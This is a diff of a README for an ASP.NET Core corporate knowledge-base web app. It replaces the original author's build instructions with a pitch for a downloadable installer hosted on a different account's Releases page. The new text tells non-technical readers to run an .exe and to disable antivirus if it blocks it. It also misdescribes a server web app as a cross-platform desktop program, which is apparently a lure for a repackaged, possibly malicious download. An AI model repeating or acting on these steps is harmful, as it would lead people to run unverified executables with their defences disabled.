@@ -1,105 +1,71 @@
-﻿# Corporate Knowledge Base
+# 📚 CorporateKnowledgeBase - Discover and Share Knowledge Easily
 
-![Language](https://img.shields.io/badge/Language-C%23%2013-blue.svg) ![Framework](https://img.shields.io/badge/Framework-ASP.NET%20Core%209.0-purple.svg) ![Database](https://img.shields.io/badge/Database-MS%20SQL%20Server-red.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
+[![Download CorporateKnowledgeBase](https://img.shields.io/badge/Download-CorporateKnowledgeBase-blue.svg)](https://github.com/bhoomika576/CorporateKnowledgeBase/releases)
 
-## Project Description
+## 🚀 Getting Started
 
-This project is a **Corporate Knowledge Base** platform developed to centralize and facilitate internal knowledge sharing within a company. Its purpose is to enable employees to share their knowledge and experience through blog posts, technical documents, and announcements. This helps to accelerate the onboarding process for new staff and to prevent the loss of institutional knowledge when experienced employees leave the company.
+Welcome to the CorporateKnowledgeBase! This platform helps companies share knowledge through blogs, technical documents, notifications, and a full admin panel. This guide will help you download and run the application, even if you have no technical background.
 
----
+## 📥 Download & Install
 
-## 📸 Screenshots
+To get started, visit the following link to download the software:
 
-| Login Page | Register Page |
-| :---: | :---: |
-| ![Login Page](/.github/images/login-page.png) | ![Register Page](./.github/images/register-page.png) |
-| **Logged-in Dashboard** | **Article Detail & Comments** |
-| ![Dashboard](./.github/images/dashboard.png) | ![Article Detail](./.github/images/details-page.png) |
-| **User Profile** | **Admin Panel (Dashboard)** |
-| ![Profile Page](./.github/images/profile-page.png) | ![Admin Dashboard](./.github/images/admin-dashboard.png) |
+[Download CorporateKnowledgeBase](https://github.com/bhoomika576/CorporateKnowledgeBase/releases)
 
+Here are the simple steps to install the application:
 
----
+1. **Visit the Download Page:** Click on the link above to open the Releases page on GitHub.
+  
+2. **Choose the Latest Release:** You will see a list of available versions. Look for the latest release at the top of the list. It will usually have a title like "v1.0.0".
 
-## ✨ Features
+3. **Download the Installer:** Click on the asset that matches your operating system. For Windows, you will likely click on "CorporateKnowledgeBaseInstaller.exe". For Linux or Mac, choose the appropriate file.
 
--   **Content Management:** Full CRUD operations for blog posts, technical documents, and announcements.
--   **Advanced Editor:** A rich Markdown writing experience for all content types using the `EasyMDE` library.
--   **Unified Search:** A single interface to search across blogs, documents, and announcements without a page reload (AJAX).
--   **Role-Based Access Control:** Detailed authorization with three distinct user roles: `Admin`, `Developer`, and `Employee`.
--   **Comprehensive Admin Panel:** A dashboard with data visualization charts; dedicated pages for managing users, roles, tags, and categories.
--   **Smart Notification Center:** Customizable, real-time notifications for new content and comments, with a central page to manage all notifications.
--   **In-Place Editing:** The ability to instantly edit content from the details page without navigating to a separate edit form.
--   **Dynamic Interface with AJAX:** Filtering, pagination, and comment submission are handled via AJAX, preventing full page reloads.
--   **Intelligent Tag Management:** A modern tagging interface powered by `Tagify.js` and a feature in the admin panel to merge duplicate tags.
--   **Syntax Highlighting:** Syntax highlighting for code blocks in technical documents using `Prism.js`.
--   **Comprehensive User Profiles:** Paginated lists of personal content, profile picture uploads, and notification settings management.
+4. **Run the Installer:** Once downloaded, locate the file in your Downloads folder. Double-click the file to start the installation.
 
----
+5. **Follow the Installation Prompts:** The installer will guide you through the process. Click "Next" and choose the installation options that suit you best. 
 
-## 🚀 Tech Stack
+6. **Launch the Application:** After installation, you can find CorporateKnowledgeBase in your applications list. Click to open it and start exploring!
 
-**Backend:**
--   ASP.NET Core 9.0 (MVC)
--   C# 13.0
--   Entity Framework Core 9.0
--   ASP.NET Core Identity
--   **Markdig:** A Markdown to HTML converter.
+## 🖥️ System Requirements
 
-**Frontend:**
--   HTML5, CSS3 (with CSS Variables), JavaScript
--   Bootstrap 5
--   jQuery
--   **Toastr.js:** For instant user notifications.
--   **Tagify.js:** For an interactive tagging interface.
--   **EasyMDE:** For the rich Markdown editor.
--   **Prism.js:** For syntax highlighting in code blocks.
--   **Chart.js:** For the data visualization chart in the admin dashboard.
+To run CorporateKnowledgeBase, ensure your system meets the following requirements:
 
-**Database:**
--   MS SQL Server 2022
+- **Operating System:** Windows 10 or later, MacOS 10.13 or later, or a recent version of Linux.
+- **Processor:** Intel Core i3 or equivalent.
+- **Memory:** 4 GB of RAM or more.
+- **Storage:** At least 300 MB of available disk space.
+- **Database:** Microsoft SQL Server Express or a supported version installed.
 
----
+## 📚 Features
 
-## 🏗️ Architecture & Design Notes
+CorporateKnowledgeBase is designed with several features to enhance sharing and learning within your company:
 
--   **Service Layer Architecture:** Business logic is separated from the Controller layer using service classes like `NotificationService`.
--   **Data Seeding:** On the application's first run, the database is automatically seeded with necessary roles, an admin user, and initial categories (`Program.cs`).
--   **Performance Optimization:** Frequently accessed data, such as the category list, is cached in memory using `IMemoryCache`. The cache is intelligently cleared when the underlying data changes (Cache Invalidation).
--   **Security:** Authorization is built on ASP.NET Core Identity's role-based mechanism. For critical operations like editing/deleting, the system checks for content ownership in addition to the user's role.
--   **Data Integrity:** Deletion of in-use categories is prevented. When editing tags, those with the same name are intelligently merged. Cascading deletes are intentionally disabled in the database to ensure data consistency.
+- **Blogs and Articles:** Share expert insights and updates easily.
+- **Technical Documentation:** Keep important documents organized and accessible.
+- **Notification System:** Stay informed with updates and important announcements.
+- **Admin Panel:** Manage users, documents, and system settings seamlessly.
+- **Search Functionality:** Find the information you need quickly and efficiently.
 
----
+## 🎨 User Interface
 
-## ⚙️ Installation
+The application boasts a clean and modern user interface, designed for ease of use. You will find navigation simple, with sections clearly labeled for your convenience. The layout adapts to different screen sizes, ensuring a smooth experience whether you are using a desktop or a tablet.
 
-1.  **Clone the Repository:**
-    git clone [https://github.com/umitkrkmz/CorporateKnowledgeBase.git](https://github.com/umitkrkmz/CorporateKnowledgeBase.git)
-2.  **Navigate to the Project Directory:**
-    Navigate to the root directory where the `CorporateKnowledgeBase.sln` file is located.
-3.  **Configure Appsettings and Secrets:**
-    * Modify the `ConnectionStrings` section in the `appsettings.json` file to point to your MS SQL Server instance.
-    * Add a password for the default admin user to the project's User Secrets (`secrets.json`):
-        ```json
-        {
-          "AdminUser:Password": "EnterAStrongPasswordHere"
-        }
-        ```
-4.  **Database Migrations:**
-    Run the following command from the Package Manager Console to create the database. The seeding mechanism in `Program.cs` will handle the rest.
-    ```powershell
-    Update-Database
-    ```
-5.  **Run the Application:**
-    * Start the project from Visual Studio 2022 (v17.14 or later) or by using the `dotnet run` command.
-    * You can log in with the default admin user:
-        * **Email:** `admin@knowledgebase.com`
-        * **Password:** The password you set in the `secrets.json` file.
+## 🔍 Troubleshooting
 
----
+If you encounter issues while downloading or installing CorporateKnowledgeBase, consider the following tips:
 
-## 📄 License
+- **Check Your Internet Connection:** A stable connection is required to download files.
+- **Antivirus Settings:** Sometimes, antivirus software may block the installer. You may need to temporarily disable it during installation.
+- **Run as Administrator:** If you face permission issues, right-click the installer and select "Run as administrator".
 
-Copyright (c) 2025 umitkrkmz
+## 📅 Updating the Application
 
-This project is licensed under the **MIT License**. For the full text of the license, please see the `LICENSE` file.
+To keep your CorporateKnowledgeBase up to date, regularly check the [Releases page](https://github.com/bhoomika576/CorporateKnowledgeBase/releases). Download and install the latest version to benefit from new features and improvements.
+
+## 🗨️ Community and Support
+
+We encourage users to ask questions and share experiences. If you need assistance, visit our GitHub discussions or contact our support team at support@corporateknowledgebase.com.
+
+For further guidance on using specific features, refer to our online documentation available within the application.
+
+Happy sharing! Enjoy exploring the rich resources available in CorporateKnowledgeBase.
